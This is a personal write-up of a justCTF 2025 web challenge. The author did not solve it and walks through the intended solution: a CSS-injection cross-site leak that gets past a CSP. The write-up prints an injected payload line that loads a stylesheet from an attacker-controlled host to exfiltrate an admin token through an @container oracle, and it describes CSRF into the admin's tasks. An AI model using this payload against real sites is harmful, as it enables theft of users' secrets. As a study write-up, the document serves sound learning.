## justCTF 2025 writeup - Simple tasks

*disclaimer : i didnt solve this challenge*

#### Solution : [Click me](https://gist.github.com/terjanq/6c9e675595504cb03ec910a9ab96474d)

### My approach

The challenge was so simple yet so hard. I started off by just going through the code and also testing the web app. I never encountered a CSP(Content-security-policy) in my CTF journey. So this was new to me.
The webapp can,
+ Create Tasks
+ add task into task*s*
+ preview task

*Every endpoint* of the website is protected by CSP  
` Content-Security-Policy: script-src 'nonce-${nonce}'; style-src 'nonce-${nonce}'`

so any injection is impossible.. but the *preview page* had a diffrent CSP  
`Content-Security-Policy", script-src 'none'`

so XSS is not possible. But i can inject CSS stylesss.!   
I recently started learning about CSS injection and Cross site leaks.. Maybe i can solve the challengeee?!

The webapp also has a bot that visits any url i give but before doing so, the bot register as admin into app and posts *a token* into the task and then do the visiting.

In all the XS-leaks... i only ever seen stealing data from same page. (i.e) the CSS injected and the target data to be stolen has to be in the same page. But the bot posts it in different task (/task/preview/0/0) and whatever we post into the admin's tasks will be in different url (/tasks/preview/0/1).

This was the part where i got stuck and read many articles as possible and searched various writeups and resources. Also tried iframes and object tags which were stupid but hey... cybersec is already crazy.  Finally i tried bringing the flag into other task preview using \<link\> tag.  But i saw nothing. (atleast my stupid eyes didn't)

Thats all. I gave up and was eagerly waiting for the answers and when i looked at them, I was soo happy that i was indeed in the right path. But i lacked practical skills and knowledge and i need more experience.

---
### Intended approach
The vulnerability exists in how the tasks are padded in .ejs templete if the note has length greater than 500  

```
<table>
    <% tasks.forEach((task, idx)=> { %>
      <tr>
        <td class="delete">
          <form action="/tasks/delete/<%= idx %>">
            <button type="submit">X</button>
          </form>
        </td>
        <td class="view">
          <form action="/tasks/<%= idx %>" method="GET">
            <button type="submit">View Task</button>
          </form>
        </td>
        <td>
          <pre><% const preview=task.tasks.join(",\n"); %><%= preview.length>500? preview.slice(0, 500) + "..." : preview %></pre>
        </td>
      </tr>
      <% }) %>
  </table>
  ```
  
with this in mind, the solution tries to inject a CSS that gets parsed in such a way that makes the universal selector with variable `--x` have a part of the flag as value which can be bought into our task preview page  and HTML is parsed as CSS when linked as a stylesheet making it as an Oracle and send request if the exfiltrated css matches our guess using @container
  
 ```
 <link rel=stylesheet href=/tasks><link rel=stylesheet href=http://localhost:5000/css/justToken{>}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{}*{--x:
 ```
The above is the line that the solution tries to inject into the admin's tasks above the token we were trying to steal using CSRF. After doing so. the /tasks looks like this

 ![](../Pictures/Screenshots/Screenshot from 2025-08-11 18-34-02.png)
 
 + ` <link rel=stylesheet href=/tasks>` This part makes the flag available in the preview page we control
 + `<link rel=stylesheet href=http://localhost:5000/css/justToken{>}` This part makes the exfiltration using @container (`localhost:5000` is attacker controlled)
 + `aaaa...` making the parsing adjustments
 + `{}` ig to close the previous css. 
 + `\*` universal selector
 + `--x:` custom variable
 
 
 as you can see the ejs parsed the CSS and the token together and in the preview we can see that the solution successfully exfiltrated the token via the injected custom variable `--x` 
 
 ![](../Pictures/Screenshots/Screenshot from 2025-08-11 18-42-12.png)  
   
Now this is used as an Oracle to exfiltrate the token and get the flag.

The exfiltration process is very tedious but fairly simple one. It uses the @container to have an if-else condition that sends a request to our webhook using background-url if our guess if correct. Very interesting. Do read it..  

I found this CTF as very interesting one. very good challenge. and i am so happy to get this close to the solution. This challenge was solved by only 1 team. Kudos to them.  
  
 This challenge made me go 	wtff	 and i thought why not share it.  
   
 Till next interesting challenges.. xOx